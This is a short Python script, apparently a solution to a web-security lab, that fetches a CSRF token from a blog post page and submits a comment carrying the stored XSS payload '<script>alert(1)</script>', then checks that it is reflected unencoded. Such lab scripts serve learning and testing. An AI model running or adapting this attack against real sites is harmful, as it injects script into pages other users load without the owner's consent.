#!/usr/bin/env python3
# https://github.com/wvverez
# Stored XSS into HTML context with nothing encoded

import sys
import requests
from bs4 import BeautifulSoup

def main():
    if len(sys.argv) != 2:
        print("[+] Mode of use: python3 XSS_2.py (url)")
        sys.exit(1)

    url = sys.argv[1].rstrip('/')
    session = requests.Session()

    # Ahora vamos a generar el token CSRF

    resp = session.get(url + "/post?postId=3")
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']

    payload = '<script>alert(1)</script>'

    data = {
        'name': 'wvverez',
        'comment': payload,
        'csrf': csrf,
        'postId': '3',
        'email': 'wvverez@gmail.com',
        'website': 'https://google.com'
    }

    # Ahora vamos a publicar el comentario

    session.post(url + "/post/comment", data=data)

    # Comprobación

    check = session.get(url + "/post?postId=3")
    if payload in check.text:
        print("[+] Lab Solved! Pwned")
    else:
        print("[!] Error")

if __name__ == '__main__':
    main()
